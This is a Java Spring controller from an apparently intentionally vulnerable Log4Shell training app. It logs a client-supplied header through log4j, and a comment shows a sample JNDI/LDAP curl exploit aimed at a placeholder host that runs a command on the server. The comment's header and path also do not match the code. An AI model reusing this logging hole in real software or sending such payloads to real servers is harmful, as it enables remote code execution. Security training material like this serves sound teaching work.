package com.example.goat4shell.Controller;

import com.example.goat4shell.Model.GoatShell;
import com.example.goat4shell.Utils.Strings;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class GoatController {
    private final static Logger logger = LogManager.getLogger(GoatController.class);
    private final GoatShell goatShell = new GoatShell("Goat Shell", Strings.GOAT_SHELL_DESCRIPTION);

    @GetMapping("/")
    public String index() {
        return "Welcome to the Mad Goat Log4Shell!";
    }

    @CrossOrigin

    @GetMapping("/goatShell")
    public GoatShell goat(@RequestHeader(value = "X-API-Version") String apiVersion) {

        // This is a vulnerable endpoint that logs the user agent
        // CVE-2021-44228 - Log4Shell
        // Example exploit: curl -H 'User-Agent: ${jndi:ldap://DOMAIN_URL:LDAP_PORT/Basic/Command/Base64/dG91Y2ggL3RtcC9NYWRHb2F0V2FzSGVyZQ==}' DOMAIN_URL:PORT/goatShell/unsafe
        // Exploit runs the command "touch /tmp/MadGoatWasHere" on the server
        logger.info("Got request from API Version: {}", apiVersion);
        return goatShell;
    }
}
